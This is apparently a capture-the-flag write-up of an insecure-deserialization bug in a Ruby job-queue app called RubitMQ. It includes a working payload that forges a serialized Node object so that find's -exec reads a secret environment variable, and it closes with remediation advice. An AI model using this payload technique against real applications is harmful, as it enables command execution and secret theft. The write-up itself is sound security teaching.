---
title: "Dojo #48 - RubitMQ"
date: 2026-03-03T01:24:02Z
categories: [ "writeup" ]
---

## Description
The RubitMQ application creates a queue of jobs based on user-provided JSON instructions. After creation, queued jobs are executed, and the web application displays the ID of the latest job.

The application does not properly sanitize user input, which leads to remote code execution via insecure deserialization.

## Code Analysis
The user input is passed to the creation of a Job and stored as the payload attribute as text:

```ruby
# Add the job to the local database
job = Job.create!(status: "queued", payload: payload)
```

Then, the `JobRunner` processes queued jobs. Before execution, the stored payload is loaded using `Oj.load(job.payload)`:

```ruby
class JobRunner
  def self.run
    Job.where(status: "queued").find_each do |job|
      data = Oj.load(job.payload)

      RubitMQ.new(data).run()

      job.update!(status: "done")
    end
  end
end
```

Once loaded, the job is executed via `RubitMQ.new(data).run()`. The `run` method checks whether the loaded object has the method `run_find`, and if so, executes it:

```ruby
class RubitMQ
  def initialize(data)
    @data = data
  end

  def run
    if @data.respond_to?(:run_find)
      @data.run_find
    end
  end
end
```

The `run_find` method is defined in the `Node` class and executes the `find` command using `Open3.capture3`:

```ruby
class Node
  def initialize(args=[])
    @args = args
  end

  def run_find()
    puts Open3.capture3("find", *@args)
  end
end
```

## Exploitation
When user-provided data is loaded using `data = Oj.load(job.payload)`, it is not sanitized or restricted, allowing arbitrary object deserialization.

What does arbitrary object deserialization mean? Serialization allows objects to be converted into a format that can be transmitted or stored and later reconstructed through deserialization.

However, if user-controlled data is deserialized without restrictions, an attacker may control which class is instantiated and what attributes it contains. This can lead to unexpected code paths being executed.

In this case, it is possible to create a serialized `Node` object in order to reach the code path that executes the `run_find` method, which will be used to exploit the vulnerability.

The following script generates a malicious serialized object:
```ruby
require "open3"
require "uri"
require "oj"

class Node
  def initialize(args=[])
    @args = args
  end

  def run_find()
    puts Open3.capture3("find", *@args)
  end
end

test = Node.new([".","-exec","printenv","FLAG","\;"])
payload = URI.decode_www_form_component(Oj.dump(test))
print payload
print "\n"
```

This produces:
```ruby
{"^o":"Node","args":[".","-exec","printenv","FLAG",";"]}
```

When this payload is submitted, the application deserializes it into a `Node` object. Since the object responds to `run_find`, the following condition is satisfied:
```ruby
    if @data.respond_to?(:run_find)
      @data.run_find
```

As a result, the `run_find` method is executed.

Because `run_find` invokes the find command with user-controlled arguments, we can abuse the `-exec` flag to execute arbitrary OS commands.

```bash
Usage: find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]

Actions:
      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
```

By supplying the arguments:
```ruby
{"^o":"Node","args":[".","-exec","printenv","FLAG",";"]}
```

the application executes:

```bash
find . -exec printenv FLAG ;
```

This allowed retrieval of the FLAG environment variable, confirming successful remote code execution. 

![](/images/dojo48/Flag.png)

## Remediation
The vulnerability is caused by two separate security issues. An insecure deserialization of user-controlled data when loading JSON via `Oj.load`. And, a lack of validation of arguments passed to a system command executed via `Open3.capture3`.

To address the insecure deserialization issue, there are three possible approaches:
- Avoid deserializing user input into arbitrary Ruby objects.
- Use strict JSON parsing that only returns primitive data types.
- Disable object deserialization features or explicitly restrict allowed classes.

For example, by specifying strict mode, the application will only accept valid JSON and will not instantiate arbitrary Ruby objects:
```ruby
Oj.load(job.payload, mode: :strict)
```


This prevents attackers from crafting serialized objects that expose dangerous methods.

To remediate the lack of input validation, the following measures should be implemented:
- Enforce strict allowlists for permitted flags.
- Explicitly block dangerous flags such as -exec, -execdir, and -ok.
- Prefer native Ruby filesystem APIs instead of invoking system commands.

Using Ruby’s Find API is a safer alternative:
```ruby
def run_find()
  Find.find(".") do |path|
    puts path if File.basename(path) == pattern
  end
```
